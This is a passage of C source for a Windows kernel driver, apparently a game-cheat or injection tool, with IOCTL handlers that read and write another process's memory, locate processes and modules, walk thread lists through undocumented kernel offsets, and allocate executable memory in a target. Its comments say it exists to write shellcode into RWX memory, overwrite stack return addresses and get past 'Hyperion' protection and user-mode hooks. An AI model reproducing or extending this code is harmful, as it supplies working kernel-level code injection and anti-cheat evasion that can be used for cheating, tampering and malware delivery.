        return STATUS_INVALID_PARAMETER;
    }

    if (inputLen < CAT_WRITE_MIN_SIZE + request->Size) {
        DbgPrint("[CatDriver] WRITE: Not enough data in buffer (%u < %u)\n",
                 inputLen, (ULONG)(CAT_WRITE_MIN_SIZE + request->Size));
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    if (!CatIsValidUserVa(request->Address, request->Size)) {
        DbgPrint("[CatDriver] WRITE: rejected bogus user VA 0x%llX (size %u)\n",
                 request->Address, request->Size);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    /* Find the target process + hold exit sync across MmCopyVirtualMemory. */
    status = CatLookupLiveProcessSync(request->ProcessId, &targetProcess);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] WRITE: CatLookupLiveProcessSync(%u) failed: 0x%08X\n",
                 request->ProcessId, status);
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* Attached probe-write + copy. Replaces MmCopyVirtualMemory, which
     * bugchecks on unmapped/readonly dest VAs under KernelMode. */
    status = CatSafeWriteToProcess(
        targetProcess,
        (PVOID)request->Address,
        (PVOID)request->Data,
        request->Size,
        &bytesCopied
    );

    /* MDL FALLBACK DISABLED — June 2026.
     *
     * Was: if (!NT_SUCCESS(status)) { CatWriteMdl(...); }
     *
     * The MDL path calls MmProbeAndLockPages, which raises STATUS_ACCESS_VIOLATION
     * when the target range straddles guard pages, is mid-unmap, or is Hyperion-
     * protected. The exception propagates up through nt!RtlRaiseStatus and
     * nt!KiSystemServiceCopyEnd, where it crosses the syscall boundary.
     * The SEH inside CatWriteMdl cannot catch exceptions that have already
     * unwound past that boundary — they bugcheck with KMODE_EXCEPTION_NOT_HANDLED
     * (0x1E, Arg1=0xC0000005).
     *
     * In practice neither catclient nor cat_inject benefit from the MDL path:
     * - Stack-return overwrites (cat_inject) go to normal RW user-mode addresses
     * - Shellcode writes go to RWX memory we just allocated via IOCTL_CAT_ALLOC_MEM
     * Both succeed through MmCopyVirtualMemory. The MDL path was only useful for
     * writing into the target's .text section (executable but not user-writable),
     * which we don't actually do.
     *
     * If we ever need .text patching again, re-enable AFTER pre-validating the
     * address range with MmIsAddressValid in the attached process context,
     * AND adding a kernel-level fault filter that runs BELOW the syscall layer
     * (probably an ExceptionRoutine on the MDL itself).
     */
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] WRITE: MmCopy failed (0x%08X), MDL fallback disabled\n", status);
    }

    CatReleaseLiveProcessSync(targetProcess);

    if (NT_SUCCESS(status)) {
        Irp->IoStatus.Information = bytesCopied;
    } else {
        DbgPrint("[CatDriver] WRITE: All methods failed (addr=0x%llX, size=%u)\n",
                 request->Address, request->Size);
        Irp->IoStatus.Information = 0;
    }

    return status;
}


/* ================================================================
 * CatGetPid — find a process by name
 *
 * Uses ZwQuerySystemInformation with SystemProcessInformation to
 * enumerate all running processes and match by image name.
 *
 * This is the standard kernel-mode way to do what usermode does
 * with CreateToolhelp32Snapshot + Process32First.
 *
 * "Finding a process in kernel mode is like finding a mouse
 *  in the house — the cat always knows." — Ancient proverb
 * ================================================================ */
static NTSTATUS CatGetPid(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS                    status;
    PCAT_GET_PID_REQUEST        request;
    PCAT_GET_PID_RESPONSE       response;
    ULONG                       inputLen;
    ULONG                       outputLen;
    PVOID                       buffer = NULL;
    ULONG                       bufferSize = 0;
    ULONG                       returnLength = 0;
    PCAT_SYSTEM_PROCESS_INFO    procInfo;
    UNICODE_STRING              targetName;
    BOOLEAN                     found = FALSE;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    if (inputLen < CAT_PID_INPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    if (outputLen < CAT_PID_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_GET_PID_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_GET_PID_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    /* Ensure the name is null-terminated (just in case) */
    request->ProcessName[259] = L'\0';
    RtlInitUnicodeString(&targetName, request->ProcessName);

    /* First call: get required buffer size */
    status = ZwQuerySystemInformation(
        CatSystemProcessInformation,    // SystemProcessInformation = 5
        NULL,
        0,
        &returnLength
    );

    /* Expected: STATUS_INFO_LENGTH_MISMATCH, returnLength now has the size */
    if (returnLength == 0) {
        DbgPrint("[CatDriver] PID: ZwQuerySystemInformation returned 0 length\n");
        Irp->IoStatus.Information = 0;
        return STATUS_UNSUCCESSFUL;
    }

    /* Allocate with some extra room — processes can spawn between calls */
    bufferSize = returnLength + 4096;
    buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'bPID');
    if (!buffer) {
        DbgPrint("[CatDriver] PID: ExAllocatePool2 failed for %u bytes\n", bufferSize);
        Irp->IoStatus.Information = 0;
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    /* Second call: actually get the data */
    status = ZwQuerySystemInformation(
        CatSystemProcessInformation,
        buffer,
        bufferSize,
        &returnLength
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] PID: ZwQuerySystemInformation failed: 0x%08X\n", status);
        ExFreePoolWithTag(buffer, 'bPID');
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* Walk the linked list of SYSTEM_PROCESS_INFORMATION entries */
    procInfo = (PCAT_SYSTEM_PROCESS_INFO)buffer;

    while (TRUE) {
        if (procInfo->ImageName.Buffer && procInfo->ImageName.Length > 0) {
            /* Case-insensitive comparison — cats don't care about case */
            if (RtlCompareUnicodeString(&procInfo->ImageName, &targetName, TRUE) == 0) {
                response->ProcessId = (ULONG)(ULONG_PTR)procInfo->UniqueProcessId;
                found = TRUE;
                DbgPrint("[CatDriver] PID: Found '%wZ' -> PID %u\n",
                         &targetName, response->ProcessId);
                break;
            }
        }

        /* Move to next entry, or we're done */
        if (procInfo->NextEntryOffset == 0)
            break;

        procInfo = (PCAT_SYSTEM_PROCESS_INFO)((ULONG_PTR)procInfo + procInfo->NextEntryOffset);
    }

    ExFreePoolWithTag(buffer, 'bPID');

    if (!found) {
        DbgPrint("[CatDriver] PID: Process '%wZ' not found. The mouse escaped.\n", &targetName);
        response->ProcessId = 0;
    }

    Irp->IoStatus.Information = CAT_PID_OUTPUT_SIZE;
    return STATUS_SUCCESS;
}


/* ================================================================
 * CatGetModuleBase — get the main module's base address + size
 *
 * For usermode processes, we attach to the process and read PEB.
 * The first entry in PEB->Ldr->InLoadOrderModuleList is always
 * the main executable module.
 *
 * Flow:
 *   1. PsLookupProcessByProcessId
 *   2. PsGetProcessPeb — get PEB address
 *   3. KeStackAttachProcess — enter target's address space
 *   4. Read PEB->Ldr->InLoadOrderModuleList->DllBase and SizeOfImage
 *   5. KeUnstackDetachProcess — leave target's address space
 *   6. ObDereferenceObject — clean up
 *
 * All reads inside the attached context are wrapped in __try/__except
 * because the target process could be wonky, and we do NOT want a
 * BSOD. Cats always land on their feet.
 * ================================================================ */
static NTSTATUS CatGetModuleBase(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS                    status;
    PCAT_MODULE_BASE_REQUEST    request;
    PCAT_MODULE_BASE_RESPONSE   response;
    ULONG                       inputLen;
    ULONG                       outputLen;
    PEPROCESS                   targetProcess = NULL;
    KAPC_STATE                  apcState;
    PCAT_PEB                    peb = NULL;
    ULONGLONG                   baseAddr = 0;
    ULONG                       imageSize = 0;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    if (inputLen < CAT_MODULE_INPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    if (outputLen < CAT_MODULE_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_MODULE_BASE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_MODULE_BASE_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    /* Find the process + hold exit sync across the KeStackAttachProcess
     * + PEB read window. */
    status = CatLookupLiveProcessSync(request->ProcessId, &targetProcess);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] MODULE: CatLookupLiveProcessSync(%u) failed: 0x%08X\n",
                 request->ProcessId, status);
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* Get PEB pointer (this works without attaching) */
    peb = (PCAT_PEB)PsGetProcessPeb(targetProcess);
    if (!peb) {
        DbgPrint("[CatDriver] MODULE: PEB is NULL for PID %u (kernel process?)\n",
                 request->ProcessId);
        CatReleaseLiveProcessSync(targetProcess);
        Irp->IoStatus.Information = 0;
        return STATUS_NOT_FOUND;
    }

    /* Attach to target process — now PEB pointers are valid for us.
     * KeStackAttachProcess is safe at IRQL <= APC_LEVEL. */
    KeStackAttachProcess(targetProcess, &apcState);

    /* Touch-probe each pointer in the deref chain before dereferencing it.
     * A single-byte read forces real PTE translation; if the user page is
     * unmapped the fault lands IN this SEH frame (not in some kernel helper
     * where MiBadAccess would bugcheck). Same reasoning as
     * CatSafeReadFromProcess. */
    __try {
        /* Probe PEB itself. */
        volatile UCHAR sink = *(volatile UCHAR*)peb;
        PCAT_PEB_LDR_DATA ldr = peb->Ldr;
        if (ldr) {
            /* Probe Ldr. */
            sink = *(volatile UCHAR*)ldr;
            if (ldr->Initialized) {
                PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
                PLIST_ENTRY first = head->Flink;
                if (first && first != head) {
                    /* Probe LDR entry before CONTAINING_RECORD-derived read. */
                    sink = *(volatile UCHAR*)first;
                    PCAT_LDR_DATA_TABLE_ENTRY entry =
                        CONTAINING_RECORD(first, CAT_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
                    sink = *(volatile UCHAR*)entry;
                    baseAddr  = (ULONGLONG)entry->DllBase;
                    imageSize = entry->SizeOfImage;
                    DbgPrint("[CatDriver] MODULE: PID %u -> Base=0x%llX, Size=0x%X (%wZ)\n",
                             request->ProcessId, baseAddr, imageSize, &entry->BaseDllName);
                }
            }
        }
        (void)sink;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[CatDriver] MODULE: Exception reading PEB for PID %u (0x%08X). Hiss!\n",
                 request->ProcessId, GetExceptionCode());
        baseAddr = 0;
        imageSize = 0;
    }

    /* Detach from target process */
    KeUnstackDetachProcess(&apcState);
    CatReleaseLiveProcessSync(targetProcess);

    /* Fill response */
    response->BaseAddress = baseAddr;
    response->ImageSize = imageSize;
    Irp->IoStatus.Information = CAT_MODULE_OUTPUT_SIZE;

    return STATUS_SUCCESS;
}


/* ----------------------------------------------------------------
 * CatGetTeb — kernel-side TEB resolution for one thread.
 * PsGetThreadTeb cannot be blocked by usermode hooks or handle
 * stripping: no user handles involved at all.
 * Owner check via ETHREAD->Cid.UniqueProcess (offset 0x40, x64,
 * stable across Win10/11 builds).
 * ---------------------------------------------------------------- */
static NTSTATUS CatGetTeb(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS                status;
    PCAT_TEB_REQUEST        request;
    PCAT_TEB_RESPONSE       response;
    ULONG                   inputLen;
    ULONG                   outputLen;
    PETHREAD                targetThread = NULL;
    PVOID                   teb = NULL;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    if (inputLen < CAT_TEB_INPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }
    if (outputLen < CAT_TEB_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_TEB_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_TEB_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    response->TebAddress = 0;
    response->NtStatus = 0;

    /* Live/owner/PP/PPL-checked lookup — owner match replaces the inline
     * ETHREAD+0x40 check. */
    status = CatLookupLiveThread(request->ThreadId, request->ProcessId, &targetThread);
    if (!NT_SUCCESS(status)) {
        response->NtStatus = status;
        DbgPrint("[CatDriver] TEB: CatLookupLiveThread(%u, pid=%u) -> 0x%08X\n",
                 request->ThreadId, request->ProcessId, status);
        Irp->IoStatus.Information = sizeof(CAT_TEB_RESPONSE);
        return STATUS_SUCCESS;
    }

    teb = PsGetThreadTeb(targetThread);
    ObDereferenceObject(targetThread);

    if (teb) {
        response->TebAddress = (ULONGLONG)(ULONG_PTR)teb;
        response->NtStatus = STATUS_SUCCESS;
    } else {
        response->NtStatus = STATUS_UNSUCCESSFUL;
        DbgPrint("[CatDriver] TEB: PsGetThreadTeb returned NULL for tid %u\n",
                 request->ThreadId);
    }

    Irp->IoStatus.Information = sizeof(CAT_TEB_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * CatGetTebsBulk — EPROCESS thread-list walk, CID-table free.
 *
 * Dynamic offset discovery (once, from calling context):
 *   TebOff        : scan own ETHREAD for own TEB value (PsGetThreadTeb)
 *   CidOff        : scan own ETHREAD for own pid (ULONG)
 *   ListHeadOff   : scan own EPROCESS for LIST_ENTRY h where
 *                   h.Flink->Blink == h && h.Blink->Flink == h
 *                   (self-consistent circular list = true head)
 *   ListEntryOff  : walk own head; the entry belonging to own ETHREAD
 *                   gives ListEntryOff = entry - ownThread
 * ---------------------------------------------------------------- */
static LONG  g_TebOff = -1, g_CidOff = -1, g_ListHeadOff = -1, g_ListEntryOff = -1;

static BOOLEAN CatDiscoverThreadOffsets(PVOID clientTeb, LONG* stepFail)
{
    PEPROCESS proc   = PsGetCurrentProcess();
    PETHREAD  thread = PsGetCurrentThread();
    if (!proc || !thread) return FALSE;

    ULONG myPid  = (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
    PVOID myTeb  = clientTeb;           // caller-supplied anchor (NtCurrentTeb)
    DbgPrint("[CatDriver] DISC: own thread=%p ownTeb=%p pid=%u\n", thread, myTeb, myPid);

    /* TebOff + CidOff from own ETHREAD */
    for (ULONG o = 0; o + 8 <= 0x1000; o += 4) {
        /* NOTE: globals init to -1 ("undiscovered"), so test <= 0, not !x */
        if (g_TebOff <= 0 && *(PVOID*)((PUCHAR)thread + o) == myTeb) g_TebOff = (LONG)o;
        if (g_CidOff <= 0 && o + 4 <= 0x700 && *(ULONG*)((PUCHAR)thread + o) == myPid) g_CidOff = (LONG)o;
    }
    if (g_TebOff <= 0) {
        /* anchor miss: KTHREAD.Teb = 0xB8 on all public Win10/11 builds.
           Probe validates resulting TEBs downstream. */
        g_TebOff = 0xB8;
        *stepFail = 1;
    }
    if (g_CidOff <= 0) {
        g_CidOff = 0x40;   /* CLIENT_ID.UniqueProcess, stable x64 */
        if (*stepFail == 0) *stepFail = 2;
    }

    /* EPROCESS holds MANY self-consistent circular lists (ActiveProcessLinks,
     * job/session/... lists). Pair (HeadOff, EntryOff) discovery: for every
     * self-consistent head H and every entry stride L, the walk is OUR thread
     * list iff EVERY walked entry at (E - L) carries our pid at CidOff.
     * That uniquely identifies ThreadListHead without any hardcoded offset. */
    for (ULONG ho = 0; ho + 16 <= 0x900; ho += 8) {
        PLIST_ENTRY h = (PLIST_ENTRY)((PUCHAR)proc + ho);
        __try {
            /* MUST be canonical kernel VA, not just non-low. A user-space
             * pointer like 0x1bf1ca000 passed the `< 0x10000` check but
             * dereferencing it from kernel context under SMAP bypasses SEH
             * dispatch and bugchecks 0x1E — observed on Win10 19041. */
            ULONG_PTR f = (ULONG_PTR)h->Flink;
            ULONG_PTR b = (ULONG_PTR)h->Blink;
            if (f < 0xFFFF800000000000ULL || b < 0xFFFF800000000000ULL) continue;
            if (((PLIST_ENTRY)f)->Blink != h || ((PLIST_ENTRY)b)->Flink != h) continue;
        } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }

        for (ULONG lo = 0; lo + 16 <= 0x1000; lo += 8) {
            PLIST_ENTRY it = h->Flink;
            int hops = 0, match = 0, total = 0;
            BOOLEAN ok = TRUE;
            __try {
                while (it != h && hops++ < 64) {
                    PUCHAR eth = (PUCHAR)it - lo;
                    ULONG pid = *(ULONG*)(eth + g_CidOff);
                    if (pid == myPid) { ++match; ++total; }
                    else if (total > 0) { ok = FALSE; break; }   // mixed list
                    else break;                                   // first entry isn't ours
                    it = it->Flink;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { ok = FALSE; }
            if (ok && match >= 2) {          // probe is multi-threaded
                g_ListHeadOff  = (LONG)ho;
                g_ListEntryOff = (LONG)lo;
                DbgPrint("[CatDriver] DISC: head=%ld entry=%ld teb=%ld cid=%ld (match=%d)\n",
                         g_ListHeadOff, g_ListEntryOff, g_TebOff, g_CidOff, match);
                return TRUE;
            }
        }
    }
    if (*stepFail == 0) *stepFail = 12;   // 8|4: head+entry pair not found
    return FALSE;
}

static NTSTATUS CatGetTebsBulk(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS                status;
    PCAT_TEBS_REQUEST       request;
    PCAT_TEBS_RESPONSE      response;
    ULONG                   inputLen, outputLen;
    PEPROCESS               targetProcess = NULL;

    inputLen  = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    if (inputLen  < CAT_TEBS_INPUT_SIZE)  { Irp->IoStatus.Information = 0; return STATUS_BUFFER_TOO_SMALL; }
    if (outputLen < CAT_TEBS_OUTPUT_SIZE) { Irp->IoStatus.Information = 0; return STATUS_BUFFER_TOO_SMALL; }

    request  = (PCAT_TEBS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_TEBS_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    response->Count = 0;
    response->NtStatus = 0;
    RtlZeroMemory(response->Tebs, sizeof(response->Tebs));

    /* Cap MaxTebs locally — don't mutate the input SystemBuffer in place,
     * which later goto paths might re-read expecting the client's original
     * value. */
    const ULONG maxTebs = (request->MaxTebs > 512) ? 512u : request->MaxTebs;

    if (g_TebOff < 0) {
        LONG stepFail = 0;
        if (!CatDiscoverThreadOffsets((PVOID)(ULONG_PTR)request->ClientTeb, &stepFail)) {
            /* 0xC0000001 | step: 1=teb anchor 2=cid 4=head 8=entry */
            response->NtStatus = STATUS_UNSUCCESSFUL | stepFail;
            DbgPrint("[CatDriver] TEBS: discovery failed step=%d (teb=%ld cid=%ld head=%ld entry=%ld)\n",
                     stepFail, g_TebOff, g_CidOff, g_ListHeadOff, g_ListEntryOff);
            Irp->IoStatus.Information = CAT_TEBS_OUTPUT_SIZE;
            return STATUS_SUCCESS;
        }
    }

    /* R0 row #6: HARD-REFUSE on any sentinel offset. Defense-in-depth: if any
     * of the four discovered offsets is still < 0 (e.g. a prior partial
     * discovery result silently persisted across reloads), the walk below
     * would dereference arbitrary kernel memory with -1 and 0x50 BSOD.
     * Fail-fast here instead. */
    if (g_TebOff < 0 || g_CidOff < 0 || g_ListHeadOff < 0 || g_ListEntryOff < 0) {
        response->NtStatus = STATUS_NOT_READY;
        DbgPrint("[CatDriver] TEBS: sentinel offset after discovery (teb=%ld cid=%ld head=%ld entry=%ld) — refuse\n",
                 g_TebOff, g_CidOff, g_ListHeadOff, g_ListEntryOff);
        Irp->IoStatus.Information = CAT_TEBS_OUTPUT_SIZE;
        return STATUS_SUCCESS;
    }

    status = CatLookupLiveProcess(request->ProcessId, &targetProcess);
    if (!NT_SUCCESS(status)) {
        response->NtStatus = status;
        Irp->IoStatus.Information = CAT_TEBS_OUTPUT_SIZE;
        return STATUS_SUCCESS;
    }

    /* walk the game's thread list via the discovered offsets */
    PLIST_ENTRY h  = (PLIST_ENTRY)((PUCHAR)targetProcess + g_ListHeadOff);
    int hops = 0;
    BOOLEAN first = TRUE;
    response->NtStatus = STATUS_SUCCESS;   /* default; break-paths override,
                                              __except overwrites — FIX 12.09:
                                              this line used to sit AFTER the
                                              loop and clobber gate statuses */
    __try {
        PLIST_ENTRY it = h->Flink;
        while (it != h && hops++ < 1024 && response->Count < maxTebs) {
            /* every deref below is inside this __try: a miscalibrated
               (HeadOff, EntryOff) pair now costs a status code, not a BSOD */
            if ((ULONG_PTR)it & 7) { response->NtStatus = STATUS_DATATYPE_MISALIGNMENT; break; }
            /* Per-step LIST_ENTRY sanity: an entry whose Flink/Blink don't
             * point back symmetrically indicates list corruption or a wrong
             * discovered offset mid-walk. The kernel's own RtlpCheckListEntry
             * bugchecks on this with 0x139 subcode 0x3; we return a status
             * instead. MUST require canonical kernel VA — a user-space
             * pointer passes `< 0x10000` but SMAP + kernel deref = 0x1E
             * past SEH. */
            {
                ULONG_PTR f = (ULONG_PTR)it->Flink;
                ULONG_PTR b = (ULONG_PTR)it->Blink;
                if (f < 0xFFFF800000000000ULL ||
                    b < 0xFFFF800000000000ULL ||
                    ((PLIST_ENTRY)f)->Blink != it ||
                    ((PLIST_ENTRY)b)->Flink != it) {
                    response->NtStatus = (LONG)0xC0000225L; /* STATUS_NOT_FOUND */
                    DbgPrint("[CatDriver] TEBS: list corruption at it=%p (hop %d)\n", it, hops);
                    break;
                }
            }
            PUCHAR eth = (PUCHAR)it - g_ListEntryOff;
            ULONG  ownerPid = *(ULONG*)(eth + g_CidOff);
            if (ownerPid == request->ProcessId) {
                PVOID teb = *(PVOID*)(eth + g_TebOff);
                if (teb) response->Tebs[response->Count++] = (ULONGLONG)(ULONG_PTR)teb;
            } else if (first) {
                /* first entry must belong to the target: if it doesn't,
                   the discovered pair is wrong for THIS process — bail
                   instead of walking a foreign list. */
                response->NtStatus = STATUS_INVALID_OWNER;
                break;
            }
            first = FALSE;
            it = it->Flink;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        response->NtStatus = GetExceptionCode();
    }

    ObDereferenceObject(targetProcess);
    DbgPrint("[CatDriver] TEBS: pid %u -> %u tebs (teb=%ld cid=%ld head=%ld entry=%ld)\n",
             request->ProcessId, response->Count,
             g_TebOff, g_CidOff, g_ListHeadOff, g_ListEntryOff);
    Irp->IoStatus.Information = CAT_TEBS_OUTPUT_SIZE;
    return STATUS_SUCCESS;
}


/* ----------------------------------------------------------------
 * CatPing — build identity + offset discovery state.
 * Answers "which build is loaded and did discovery work" without
 * external debug tooling.
 * ---------------------------------------------------------------- */
static const CHAR g_BuildId[] = __DATE__ " " __TIME__;

static NTSTATUS CatPing(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_PING_RESPONSE  response;
    ULONG               inputLen;
    ULONG               outputLen;

    inputLen  = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;
    if (outputLen < CAT_PING_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    /* Honor the discovery-reset cookie if the client supplied input. If a
     * previous caller baked bad offsets into globals, this gives tools a
     * way to recover without reloading the driver. */
    if (inputLen >= sizeof(CAT_PING_REQUEST)) {
        PCAT_PING_REQUEST req = (PCAT_PING_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (req->ResetCookie == CAT_PING_RESET_DISCOVERY) {
            DbgPrint("[CatDriver] PING: discovery reset requested (teb=%ld cid=%ld head=%ld entry=%ld)\n",
                     g_TebOff, g_CidOff, g_ListHeadOff, g_ListEntryOff);
            g_TebOff = g_CidOff = g_ListHeadOff = g_ListEntryOff = -1;
        }
    }

    response = (PCAT_PING_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
    RtlZeroMemory(response, sizeof(*response));

    response->BuildLen = (ULONG)strlen(g_BuildId);
    if (response->BuildLen > sizeof(response->BuildId))
        response->BuildLen = sizeof(response->BuildId);
    RtlCopyMemory(response->BuildId, g_BuildId, response->BuildLen);

    response->TebOff        = g_TebOff;
    response->CidOff        = g_CidOff;
    response->ListHeadOff   = g_ListHeadOff;
    response->ListEntryOff  = g_ListEntryOff;
    response->OsBuildNumber = g_OsBuildNumber;

    Irp->IoStatus.Information = CAT_PING_OUTPUT_SIZE;
    return STATUS_SUCCESS;
}

/* ================================================================
 * CatAttachedRead — memory read of a target VA via MmCopyVirtualMemory.
 *
 * Previous impl did `RtlCopyMemory` under KeStackAttachProcess, which
 * BSODed on Hyperion-torn pages (0x1E / 0x50, exception past syscall
 * boundary). Plan R0.1#2 fix: use MmCopyVirtualMemory(KernelMode),
 * which has internal fault handling and returns STATUS_PARTIAL_COPY on
 * unmapped pages instead of bugchecking.
 *
 * CRITICAL: NO KeStackAttachProcess here. When attached,
 * PsGetCurrentProcess() returns the TARGET and MmCopyVirtualMemory sees
 * source==destination — which internally short-circuits to direct copy
 * and can still bugcheck. MmCopyVirtualMemory handles cross-process
 * traversal itself; attach is both unnecessary and harmful.
 * ================================================================ */
static NTSTATUS CatAttachedRead(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_READ_REQUEST   request;
    PEPROCESS           targetProcess = NULL;
    NTSTATUS            status;
    ULONG               inputLen, outputLen;
    PVOID               kbuf = NULL;
    SIZE_T              bytesCopied = 0;

    inputLen = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    outputLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;

    if (inputLen < CAT_READ_INPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_READ_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    if (request->Size == 0 || request->Size > CAT_MAX_TRANSFER_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    if (outputLen < request->Size) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    if (!CatIsValidUserVa(request->Address, request->Size)) {
        DbgPrint("[CatDriver] ATTACHED_READ: rejected bogus VA 0x%llX (size %u)\n",
                 request->Address, request->Size);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    status = CatLookupLiveProcessSync(request->ProcessId, &targetProcess);
    if (!NT_SUCCESS(status)) {
        Irp->IoStatus.Information = 0;
        return status;
    }

    /* Save params before we overwrite SystemBuffer with output */
    ULONGLONG addr = request->Address;
    ULONG     size = request->Size;

    kbuf = ExAllocatePoolWithTag(NonPagedPool, size, 'bATR');
    if (!kbuf) {
        CatReleaseLiveProcessSync(targetProcess);
        Irp->IoStatus.Information = 0;
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    /* Attached touch-probe + copy. kbuf lives in NonPagedPool so it's
     * mapped in every address space's view of system memory, including
     * the target process while we're attached to it. */
    status = CatSafeReadFromProcess(
        targetProcess, (PVOID)addr, kbuf, size, &bytesCopied
    );
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] ATTACHED_READ: 0x%08X at VA 0x%llX\n", (ULONG)status, addr);
    }

    CatReleaseLiveProcessSync(targetProcess);

    if (NT_SUCCESS(status) && bytesCopied > 0) {
        RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, kbuf, bytesCopied);
        Irp->IoStatus.Information = bytesCopied;
    } else {
        Irp->IoStatus.Information = 0;
        if (NT_SUCCESS(status)) status = STATUS_PARTIAL_COPY;
        DbgPrint("[CatDriver] ATTACHED_READ: VA 0x%llX size %u -> 0x%08X, copied=%llu\n",
                 addr, size, (ULONG)status, (ULONGLONG)bytesCopied);
    }

    ExFreePoolWithTag(kbuf, 'bATR');
    return status;
}


/* ================================================================
 * CatAllocMem — allocate memory in target process
 *
 * Opens the target process, calls ZwAllocateVirtualMemory.
 * Caller specifies size and protection (e.g. PAGE_EXECUTE_READWRITE).
 * ================================================================ */
static NTSTATUS CatAllocMem(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_ALLOC_REQUEST  request;
    PCAT_ALLOC_RESPONSE response;
    NTSTATUS            status;
    HANDLE              hProcess = NULL;
    OBJECT_ATTRIBUTES   oa;
    CLIENT_ID           cid;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_ALLOC_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_ALLOC_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_ALLOC_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    if (request->Size == 0 || request->Size > CAT_MAX_TRANSFER_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    /* Save params — SystemBuffer is shared in/out */
    ULONG pid  = request->ProcessId;
    ULONG sz   = request->Size;
    ULONG prot = request->Protection;

    /* Sanitize Protection — mirror of the CatProtectMem check. ZwAllocateVirtualMemory
     * with a bogus prot can trip internal assertions. */
    {
        const ULONG kValidProt =
            PAGE_NOACCESS | PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
            PAGE_EXECUTE  | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
            PAGE_EXECUTE_WRITECOPY | PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE;
        if ((prot & ~kValidProt) != 0 || prot == 0) {
            DbgPrint("[CatDriver] ALLOC: rejected bad prot 0x%X\n", prot);
            Irp->IoStatus.Information = 0;
            return STATUS_INVALID_PAGE_PROTECTION;
        }
    }

    /* Live/PP/PPL gate before Zw-opening the target handle. */
    {
        PEPROCESS gateProc = NULL;
        status = CatLookupLiveProcess(pid, &gateProc);
